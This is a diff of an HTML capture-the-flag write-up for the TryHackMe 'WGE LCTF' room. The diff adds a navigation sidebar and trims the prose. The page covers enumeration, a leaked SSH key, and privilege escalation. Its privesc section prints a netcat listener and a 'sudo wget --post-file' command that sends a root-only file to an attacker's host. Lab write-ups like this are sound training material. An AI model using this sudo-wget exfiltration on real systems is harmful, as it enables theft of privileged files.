@@ -5,6 +5,9 @@
   <title>WGE LCTF | TryHackMe Writeup</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
+    html {
+      scroll-behavior: smooth;
+    }
     body {
       background-color: #0d0d0d;
       color: #b9fbc0;
@@ -48,16 +51,82 @@
     .section {
       margin-bottom: 3em;
     }
+
+    /* Sidebar Styles */
+    .sidebar {
+      position: fixed;
+      top: 100px;
+      left: 20px;
+      width: 160px;
+      background: rgba(20, 20, 40, 0.85);
+      border: 1px solid #00f5d4;
+      padding: 1em;
+      border-radius: 10px;
+      font-size: 0.9em;
+      z-index: 999;
+    }
+
+    .sidebar h3 {
+      color: #00f5d4;
+      font-size: 1.1em;
+      margin-bottom: 0.6em;
+      text-align: center;
+    }
+
+    .sidebar ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .sidebar li {
+      margin-bottom: 0.6em;
+    }
+
+    .sidebar a {
+      color: #b9fbc0;
+      text-decoration: none;
+    }
+
+    .sidebar a:hover {
+      color: #ff4ecd;
+      text-shadow: 0 0 5px #ff4ecd;
+    }
+
+    /* Add top margin so content doesn't hide behind sidebar */
+    @media (max-width: 1000px) {
+      .sidebar {
+        display: none;
+      }
+    }
   </style>
 </head>
 <body>
 
+  <!-- Sidebar -->
+  <div class="sidebar">
+    <h3>☰ Quick Nav</h3>
+    <ul>
+      <li><a href="#recon">🔎 Recon</a></li>
+      <li><a href="#apache">🌐 Apache</a></li>
+      <li><a href="#sitemap">📂 /sitemap</a></li>
+      <li><a href="#gobuster">🛠️ Gobuster</a></li>
+      <li><a href="#comment">👀 Comment</a></li>
+      <li><a href="#ssh">🔑 SSH Key</a></li>
+      <li><a href="#login">🔐 SSH Login</a></li>
+      <li><a href="#sudo">🧪 Sudo Priv</a></li>
+      <li><a href="#userflag">📜 User Flag</a></li>
+      <li><a href="#privesc">⚡ PrivEsc</a></li>
+      <li><a href="#rootflag">🏁 Root Flag</a></li>
+      <li><a href="#summary">✅ Summary</a></li>
+    </ul>
+  </div>
+
   <h1>🚩 TryHackMe – WGE LCTF Writeup</h1>
   <p><strong>Room:</strong> <a href="https://tryhackme.com/room/wgelctf" target="_blank">WGE LCTF</a></p>
 
-  <div class="section">
+  <div class="section" id="recon">
     <h2>🔎 Initial Recon</h2>
-    <p>Nmap scan on <code>10.10.141.118</code>:</p>
     <img src="assets/img/wgel/scan.png" alt="Nmap scan">
     <ul>
       <li>22/tcp – SSH</li>
@@ -65,83 +134,70 @@
     </ul>
   </div>
 
-  <div class="section">
+  <div class="section" id="apache">
     <h2>🌐 Apache Default Page</h2>
-    <p>Port 80 shows Apache default page:</p>
     <img src="assets/img/wgel/apache-server.png" alt="Apache default">
   </div>
 
-  <div class="section">
+  <div class="section" id="sitemap">
     <h2>📂 Hidden Page Discovered</h2>
-    <p>Manually navigating to <code>/sitemap/</code> shows an Unapp landing page:</p>
     <img src="assets/img/wgel/sitemap-found.png" alt="Unapp template">
   </div>
 
-  <div class="section">
+  <div class="section" id="gobuster">
     <h2>🛠️ Gobuster Enumeration</h2>
-    <p>Running Gobuster on the root path reveals a suspicious <code>.ssh</code> folder:</p>
-    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster finds .ssh">
-
-    <p>Running Gobuster directly on <code>/sitemap/</code> shows even more structure, including the same <code>.ssh</code> folder, proving the leak is inside that path:</p>
-    <img src="assets/img/wgel/sitemap-gobuster.png" alt="Gobuster on /sitemap">
+    <img src="assets/img/wgel/gobuster-found.png" alt="Gobuster root">
+    <img src="assets/img/wgel/sitemap-gobuster.png" alt="Gobuster sitemap">
   </div>
 
-  <div class="section">
+  <div class="section" id="comment">
     <h2>👀 Developer Comment</h2>
-    <p>Viewing the HTML source of the landing page, we find a dev note:</p>
-    <img src="assets/img/wgel/source-code.png" alt="Dev comment">
+    <img src="assets/img/wgel/source-code.png" alt="Comment">
     <blockquote><em>"Jessie don't forget to update the website"</em></blockquote>
   </div>
 
-  <div class="section">
+  <div class="section" id="ssh">
     <h2>🔑 SSH Key Disclosure</h2>
-    <p>Inside <code>/sitemap/.ssh/</code>, a private key is fully exposed:</p>
-    <img src="assets/img/wgel/ssh-found.png" alt="Private key found">
+    <img src="assets/img/wgel/ssh-found.png" alt="SSH Key">
   </div>
 
-  <div class="section">
+  <div class="section" id="login">
     <h2>🔐 SSH Access Gained</h2>
-    <p>We use the key to login as <code>jessie</code>:</p>
-    <img src="assets/img/wgel/ssh-login.png" alt="SSH login successful">
+    <img src="assets/img/wgel/ssh-login.png" alt="SSH login">
   </div>
 
-  <div class="section">
-    <h2>🔍 Sudo Privileges Review</h2>
-    <p><code>wget</code> is allowed via <code>sudo</code> with no password:</p>
-    <img src="assets/img/wgel/sudo-l.png" alt="Sudo privileges">
+  <div class="section" id="sudo">
+    <h2>🧪 Sudo Privileges Review</h2>
+    <img src="assets/img/wgel/sudo-l.png" alt="sudo -l">
   </div>
 
-  <div class="section">
+  <div class="section" id="userflag">
     <h2>📜 user_flag.txt Captured</h2>
-    <p>We find <code>user_flag.txt</code> using <code>find / -name user_flag.txt</code>:</p>
     <img src="assets/img/wgel/userflag.txt.png" alt="User flag">
   </div>
 
-  <div class="section">
+  <div class="section" id="privesc">
     <h2>⚡ Manual PrivEsc via wget --post-file</h2>
-    <p>GTFOBins lists <code>wget</code> for privilege escalation, but the reverse shell technique didn’t work on this machine.</p>
-    <p>Instead, we use <code>--post-file</code> to send <code>/root/root_flag.txt</code> to our own HTTP listener:</p>
-    <img src="assets/img/wgel/wget-vuln.png" alt="wget --post-file trick">
+    <p>GTFOBins' reverse shell using wget didn't work on this host, so I manually used <code>--post-file</code> to exfiltrate <code>/root/root_flag.txt</code>.</p>
+    <img src="assets/img/wgel/wget-vuln.png" alt="wget trick">
     <pre><code># Attacker:
 nc -lvnp 80
 
 # Victim:
 sudo /usr/bin/wget --post-file=/root/root_flag.txt http://YOUR-IP</code></pre>
-    <p>The flag is delivered via POST!</p>
   </div>
 
-  <div class="section">
+  <div class="section" id="rootflag">
     <h2>🏁 root_flag.txt Captured</h2>
-    <p>We capture the root flag on our listener:</p>
-    <img src="assets/img/wgel/rootflag.png" alt="Root flag received">
+    <img src="assets/img/wgel/rootflag.png" alt="Root flag">
   </div>
 
-  <div class="section">
+  <div class="section" id="summary">
     <h2>✅ Summary</h2>
     <ul>
-      <li>🔓 SSH key leaked → Access as <code>jessie</code></li>
-      <li>🔧 Sudo allowed <code>wget</code> → Exploited manually</li>
-      <li>🚩 Captured <code>user_flag.txt</code> and <code>root_flag.txt</code></li>
+      <li>Leaked SSH key → access as <code>jessie</code></li>
+      <li><code>wget</code> as sudo → used <code>--post-file</code> for root flag</li>
+      <li>Flags captured: <code>user_flag.txt ✅</code> <code>root_flag.txt ✅</code></li>
     </ul>
   </div>
 
